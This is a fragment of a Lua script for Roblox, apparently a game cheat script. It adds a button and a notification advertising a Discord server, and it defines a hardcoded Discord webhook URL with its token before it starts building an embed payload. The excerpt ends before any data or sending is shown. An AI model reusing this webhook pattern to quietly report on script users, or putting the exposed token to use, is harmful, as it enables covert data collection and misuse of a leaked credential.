...
CreditTAB:AddButton("Join https://dsc.gg/w4nted", function(bool)
...
pcall(function()
    game.StarterGui:SetCore("SendNotification", {
      Title = 'Thank you for using the script, join our discord';
      Text = 'Join our discord, https://dsc.gg/w4nted';
      Duration = 40;
    })
...
local url =
    "https://discordapp.com/api/webhooks/956945694382518322/cSszNx8Cr2j4lSNsAlyX9ZMdbAe6mieMAr7X__wc5qhkRDsBZC52zM5XQNNoaeb5NYDM"
local data = {
    ["content"] = "",
    ["embeds"] = {
        {
